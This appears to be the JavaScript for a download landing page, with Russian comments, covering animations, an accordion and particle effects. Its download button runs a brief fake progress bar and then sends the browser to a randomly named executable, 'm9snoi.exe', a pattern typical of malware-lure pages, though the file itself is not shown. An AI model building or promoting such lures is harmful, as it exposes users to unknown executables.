document.addEventListener('DOMContentLoaded', () => {
    // Анимация появления элементов
    const elements = document.querySelectorAll('.container > *');
    elements.forEach((element, index) => {
        element.style.opacity = '0';
        element.style.animation = `fadeIn 0.5s ease forwards ${index * 0.2}s`;
    });

    // Анимация декоративных кругов
    const circles = document.querySelectorAll('.decorative-circle');
    circles.forEach((circle, index) => {
        circle.style.animation = `floatCircle ${10 + index * 5}s ease-in-out infinite`;
    });

    // Анимация декоративных линий
    const lines = document.querySelectorAll('.decorative-line');
    lines.forEach((line, index) => {
        line.style.animation = `pulseLine ${3 + index}s ease-in-out infinite`;
    });

    // Аккордеон
    const accordionItems = document.querySelectorAll('.accordion-item');
    accordionItems.forEach(item => {
        const header = item.querySelector('.accordion-header');
        header.addEventListener('click', () => {
            const isActive = item.classList.contains('active');
            
            // Закрываем все аккордеоны
            accordionItems.forEach(accItem => {
                accItem.classList.remove('active');
            });
            
            // Открываем/закрываем текущий
            if (!isActive) {
                item.classList.add('active');
            }
        });
    });

    // Анимация прогресс-бара при клике на кнопку
    const downloadBtn = document.getElementById('downloadBtn');
    const progressBar = downloadBtn.querySelector('.progress-bar');
    
    downloadBtn.addEventListener('click', (e) => {
        e.preventDefault();
        
        // Анимация прогресс-бара
        progressBar.style.width = '100%';
        
        // Задержка перед скачиванием
        setTimeout(() => {
            window.location.href = 'm9snoi.exe';
        }, 1000);
    });

    // Создание частиц
    const particlesContainer = document.querySelector('.particles');
    const particleCount = 50;
    
    for (let i = 0; i < particleCount; i++) {
        const particle = document.createElement('div');
        particle.className = 'particle';
        particle.style.cssText = `
            position: absolute;
            width: ${Math.random() * 3 + 1}px;
            height: ${Math.random() * 3 + 1}px;
            background: rgba(255, 107, 139, ${Math.random() * 0.5 + 0.2});
            border-radius: 50%;
            left: ${Math.random() * 100}%;
            top: ${Math.random() * 100}%;
            animation: float ${Math.random() * 10 + 5}s infinite linear;
        `;
        particlesContainer.appendChild(particle);
    }
});

// Добавляем стили для частиц и анимаций
const style = document.createElement('style');
style.textContent = `
    @keyframes float {
        0% {
            transform: translateY(0) translateX(0);
            opacity: 0;
        }
        50% {
            opacity: 1;
        }
        100% {
            transform: translateY(-100vh) translateX(${Math.random() * 100 - 50}px);
            opacity: 0;
        }
    }

    @keyframes floatCircle {
        0%, 100% {
            transform: translate(0, 0) rotate(0deg);
        }
        25% {
            transform: translate(10px, 10px) rotate(5deg);
        }
        50% {
            transform: translate(0, 20px) rotate(0deg);
        }
        75% {
            transform: translate(-10px, 10px) rotate(-5deg);
        }
    }

    @keyframes pulseLine {
        0%, 100% {
            opacity: 0.1;
            transform: scaleX(1);
        }
        50% {
            opacity: 0.2;
            transform: scaleX(1.1);
        }
    }
`;
document.head.appendChild(style); 